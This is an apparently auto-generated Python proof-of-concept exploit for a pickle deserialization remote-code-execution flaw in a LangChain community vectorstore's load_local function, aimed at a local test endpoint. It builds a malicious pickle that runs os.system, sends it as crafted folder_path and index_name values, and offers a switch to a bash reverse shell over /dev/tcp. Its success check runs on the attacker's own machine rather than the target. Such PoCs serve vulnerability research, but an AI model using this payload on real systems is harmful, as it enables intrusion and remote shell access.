#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_19.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: The load_local function in ScaNN vectorstore uses pickle.load()
on a file path constructed from user-controlled folder_path and index_name.
If allow_dangerous_deserialization is set to True (as intended for normal use),
an attacker can control the path to load a malicious pickle file, leading to
arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Using path traversal in folder_path to point to the malicious file
3. Triggering the load_local function with the crafted path

Usage:
    python3 poc.py [--target http://localhost:8000] [--lhost IP] [--lport PORT]
"""

import argparse
import base64
import os
import pickle
import subprocess
import sys
import tempfile
import time
import requests

# =============================================================================
# Configuration
# =============================================================================
TARGET_URL = "http://localhost:8000"
LHOST = "127.0.0.1"
LPORT = 4444

# =============================================================================
# Malicious pickle payload generator
# =============================================================================
def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes the given command.
    
    Uses __reduce__ to execute arbitrary code during unpickling.
    The command is executed via os.system().
    """
    class MaliciousPickle:
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPickle())

def create_reverse_shell_payload(lhost: str, lport: int) -> str:
    """
    Generate a reverse shell command.
    Uses bash reverse shell as a common example.
    """
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

# =============================================================================
# Main exploit logic
# =============================================================================
def exploit(target_url: str, lhost: str, lport: int, benign: bool = True):
    """
    Execute the exploit against the target.
    
    Args:
        target_url: Base URL of the vulnerable service
        lhost: Local host for reverse shell (if not benign)
        lport: Local port for reverse shell (if not benign)
        benign: If True, use a benign command (touch /tmp/poc_success.txt)
    """
    
    # Step 1: Create the malicious pickle file
    print("[*] Creating malicious pickle payload...")
    
    if benign:
        # Benign command - creates a file to prove code execution
        command = "touch /tmp/poc_success.txt"
        print(f"[*] Using benign command: {command}")
    else:
        # Reverse shell (requires listener)
        command = create_reverse_shell_payload(lhost, lport)
        print(f"[*] Using reverse shell command (ensure listener on {lhost}:{lport})")
    
    malicious_pickle = create_malicious_pickle(command)
    
    # Step 2: Write the malicious pickle to a temporary directory
    # We'll use a path traversal to point to this directory
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create the pickle file with a predictable name
        pickle_filename = "exploit.pkl"
        pickle_path = os.path.join(tmpdir, pickle_filename)
        
        with open(pickle_path, "wb") as f:
            f.write(malicious_pickle)
        
        print(f"[*] Malicious pickle written to: {pickle_path}")
        
        # Step 3: Construct the path traversal payload
        # The vulnerable code does: Path(folder_path) / "{index_name}.pkl"
        # We can use folder_path to point to our temp directory
        # and index_name to specify the filename (without .pkl)
        
        # For path traversal, we can use an absolute path or relative path
        # Using absolute path to the temp directory
        folder_path = tmpdir  # This is an absolute path
        index_name = "exploit"  # This will become "exploit.pkl"
        
        print(f"[*] Crafted payload:")
        print(f"    folder_path: {folder_path}")
        print(f"    index_name: {index_name}")
        
        # Step 4: Send the exploit request
        # The vulnerable endpoint is assumed to be /api/v1/trigger
        # which calls load_local with attacker-controlled input
        
        print(f"[*] Sending exploit to {target_url}/api/v1/trigger")
        
        # The exact request format depends on the simulated app controller
        # We'll try multiple common formats
        
        # Format 1: JSON body
        payload_json = {
            "folder_path": folder_path,
            "index_name": index_name,
            "allow_dangerous_deserialization": True
        }
        
        # Format 2: Query parameters
        payload_query = {
            "folder_path": folder_path,
            "index_name": index_name,
            "allow_dangerous_deserialization": "true"
        }
        
        # Try JSON first
        try:
            response = requests.post(
                f"{target_url}/api/v1/trigger",
                json=payload_json,
                timeout=10
            )
            print(f"[*] JSON request sent. Status: {response.status_code}")
            print(f"[*] Response: {response.text[:200]}")
        except requests.exceptions.RequestException as e:
            print(f"[!] JSON request failed: {e}")
            
            # Try query parameters
            try:
                response = requests.post(
                    f"{target_url}/api/v1/trigger",
                    params=payload_query,
                    timeout=10
                )
                print(f"[*] Query request sent. Status: {response.status_code}")
                print(f"[*] Response: {response.text[:200]}")
            except requests.exceptions.RequestException as e2:
                print(f"[!] Query request also failed: {e2}")
                print("[!] The target endpoint may have a different interface")
                print("[!] Check the actual API endpoint and adjust accordingly")
        
        # Step 5: Verify the exploit (for benign payload)
        if benign:
            time.sleep(1)  # Give time for command execution
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] SUCCESS: /tmp/poc_success.txt was created!")
                print("[+] Code execution confirmed!")
                # Clean up
                os.remove("/tmp/poc_success.txt")
            else:
                print("[*] Could not verify file creation on target")
                print("[*] The target may not have write access to /tmp")
                print("[*] Or the exploit may have failed")
        
        print("[*] Exploit completed")

# =============================================================================
# Main entry point
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community-only RCE via pickle deserialization"
    )
    parser.add_argument(
        "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "--lhost",
        default=LHOST,
        help=f"Local host for reverse shell (default: {LHOST})"
    )
    parser.add_argument(
        "--lport",
        type=int,
        default=LPORT,
        help=f"Local port for reverse shell (default: {LPORT})"
    )
    parser.add_argument(
        "--reverse",
        action="store_true",
        help="Use reverse shell instead of benign command"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("langchain-community-only RCE PoC")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] Mode: {'Reverse shell' if args.reverse else 'Benign'}")
    print()
    
    exploit(
        target_url=args.target,
        lhost=args.lhost,
        lport=args.lport,
        benign=not args.reverse
    )

if __name__ == "__main__":
    main()
